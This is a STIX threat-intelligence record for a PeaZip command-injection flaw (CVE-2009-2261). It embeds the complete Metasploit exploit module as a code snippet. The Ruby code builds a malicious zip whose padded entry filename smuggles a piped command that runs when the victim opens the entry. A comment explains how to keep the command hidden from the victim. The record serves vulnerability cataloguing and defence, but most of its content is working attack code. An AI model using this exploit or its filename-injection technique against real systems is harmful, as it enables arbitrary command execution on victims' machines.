{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e656af8f-f3df-43c4-a483-ad840b3d404d",
    "created": "2024-08-14T17:05:11.514487Z",
    "modified": "2024-08-14T17:05:11.514494Z",
    "name": "PeaZip Zip Processing Command Injection",
    "description": " This module exploits a command injection vulnerability in PeaZip. All versions prior to 2.6.2 are suspected vulnerable. Testing was conducted with version 2.6.1 on Windows.  In order for the command to be executed, an attacker must convince someone to open a specially crafted zip file with PeaZip, and access the specially file via double-clicking it. By doing so, an attacker can execute arbitrary commands as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/peazip_command_injection.rb",
            "external_id": "peazip_command_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2261"
        },
        {
            "source_name": "reference",
            "url": "http://peazip.sourceforge.net/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PeaZip Zip Processing Command Injection',\n      'Description'    => %q{\n          This module exploits a command injection vulnerability in PeaZip. All\n        versions prior to 2.6.2 are suspected vulnerable. Testing was conducted with\n        version 2.6.1 on Windows.\n\n        In order for the command to be executed, an attacker must convince someone to\n        open a specially crafted zip file with PeaZip, and access the specially file via\n        double-clicking it. By doing so, an attacker can execute arbitrary commands\n        as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'pyrokinesis', # Of Nine:Situations:Group\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2261' ],\n          [ 'OSVDB', '54966' ],\n          [ 'URL', 'http://peazip.sourceforge.net/' ],\n          [ 'EDB', '8881' ]\n        ],\n      'Platform'       => %w{ linux unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic', { }],\n        ],\n      'DisclosureDate' => '2009-06-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.', 'msf.zip']),\n      ])\n  end\n\n\n  def exploit\n\n    # NOTE: using a command line containing / or \\ will result in the command\n    # being easily visible to the victim\n    cmd = datastore['CMD']\n\n    fname = \"README.TXT\"\n    rest = \"\\\"|#{cmd}|.txt\"\n    fname << \" \" * (255 - fname.length - rest.length)\n    fname << rest\n\n    content = rand_text_alphanumeric(rand(1024))\n\n    zip = Rex::Zip::Archive.new\n    zip.add_file(fname, content)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(zip.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-06-05",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}